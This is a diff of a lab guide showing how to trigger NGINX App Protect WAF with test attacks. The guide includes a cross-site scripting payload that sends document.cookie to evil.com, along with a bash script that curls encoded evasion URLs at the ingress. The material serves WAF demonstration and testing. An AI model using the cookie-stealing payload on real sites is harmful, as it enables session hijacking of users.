@@ -38,7 +38,7 @@ Did you notice the blocking page is similar to F5 ASM and Adv. WAF?
 
 image:image18.png[image]
 
-. Execute the second attack by appending
+Execute the second attack by appending
 `?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`
 to the application URL, and observe the results.
 
@@ -133,11 +133,8 @@ Protect WAF to protect your applications from attacks.
 
 == Optional Attack Payloads to Trigger App Protect
 
-== Optional Attack Payloads to Trigger App Protect
-
-== Optional Attack Payloads to Trigger App Protect
-
-Use these by appending them to the application URL (e.g., `http://$nginx_ingress/`):
+Use these by appending them to the application URL +
+(e.g., `http://$nginx_ingress/`)
 
 *SQL Injection* +
 [source,sh,role=execute]
@@ -211,58 +208,58 @@ Execute the attack by running the following bash script from the
 terminal window:
 ====
 
-[source,sh,role=execute]
+[source,bash]
 ----
+cat << 'EOF' > waf_test.sh
 #!/bin/bash
+
 echo "------------------------------"
 echo "Starting security testing..."
 echo "------------------------------"
 echo ""
 
 # Get the external IP address of the NGINX Ingress Controller
-EXTERNAL_IP=$(oc get service my-nginx-ingress-controller-nginx-ingress -n nginx-ingress | awk 'NR==2{print $4}')
+EXTERNAL_IP=\$(oc get service my-nginx-ingress -n nginx-ingress | awk 'NR==2{print \$4}')
 
 echo "---------------------------------------------------------------------"
 echo "Multiple decoding"
-echo "Sending: curl -k 'http://$EXTERNAL_IP/three_decodin%2525252567.html'"
+echo "Sending: curl -k 'http://\$EXTERNAL_IP/three_decodin%2525252567.html'"
 echo "---------------------------------------------------------------------"
-
-# Send a request with multiple decoding
-curl -k "http://$EXTERNAL_IP/three_decodin%2525252567.html"
+curl -k "http://\$EXTERNAL_IP/three_decodin%2525252567.html"
 sleep 3
 
 echo "-----------------------------------------------------------------------------"
 echo "Apache Whitespace"
-echo "Sending: curl -k 'http://$EXTERNAL_IP/tab_escaped%09.html'"
+echo "Sending: curl -k 'http://\$EXTERNAL_IP/tab_escaped%09.html'"
 echo "-----------------------------------------------------------------------------"
-
-# Send a request with Apache whitespace
-curl -k "http://$EXTERNAL_IP/tab_escaped%09.html"
+curl -k "http://\$EXTERNAL_IP/tab_escaped%09.html"
 sleep 3
 
 echo "-----------------------------------------------------------------------------"
 echo "IIS Backslashes"
-echo "Sending: curl -k 'http://$EXTERNAL_IP/regular%5cescaped_back.html'"
+echo "Sending: curl -k 'http://\$EXTERNAL_IP/regular%5cescaped_back.html'"
 echo "-----------------------------------------------------------------------------"
-
-# Send a request with IIS backslashes
-curl -k "http://$EXTERNAL_IP/regular%5cescaped_back.html"
+curl -k "http://\$EXTERNAL_IP/regular%5cescaped_back.html"
 sleep 3
 
 echo "-----------------------------------------------------------------------------"
 echo "Carriage Return Escaping"
-echo "Sending: curl -k 'http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2'"
+echo "Sending: curl -k 'http://\$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2'"
 echo "-----------------------------------------------------------------------------"
-
-# Send a request with carriage return escaping
-curl -k "http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2"
+curl -k "http://\$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2"
 sleep 3
 
 echo "-----------------------------------------------------------------------------"
 echo "Cross-site scripting"
-echo "Sending: curl -k 'http://$EXTERNAL_IP/%25%25252541PPDATA%25'"
+echo "Sending: curl -k 'http://\$EXTERNAL_IP/%25%25252541PPDATA%25'"
 echo "-----------------------------------------------------------------------------"
+curl -k "http://\$EXTERNAL_IP/%25%25252541PPDATA%25"
 
-# Send a request with cross-site scripting payload
-curl -k "http://$EXTERNAL_IP/%25%25252541PPDATA%25"
+EOF
 ----
+
+[source,sh,role=execute]
+----
+chmox +x waf_test.sh && ./waf_test.sh
+----
+
